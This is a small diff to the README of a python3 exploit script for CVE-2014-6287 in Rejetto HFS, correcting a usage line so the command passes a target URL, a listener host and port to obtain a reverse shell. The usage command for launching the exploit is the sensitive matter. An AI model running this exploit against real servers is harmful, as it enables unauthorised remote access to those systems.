@@ -12,7 +12,7 @@ A python3 script for the CVE-2014-6287 Rejetto HFS exploit in order get a revers
 
 * With python3
 ```
-python3 hfs.py -t http://hfssite.com -lport 127.0.0.1 -lport 9001
+python3 hfs.py -t http://hfssite.com -lhost 127.0.0.1 -lport 9001
 ```
 
 ## Help
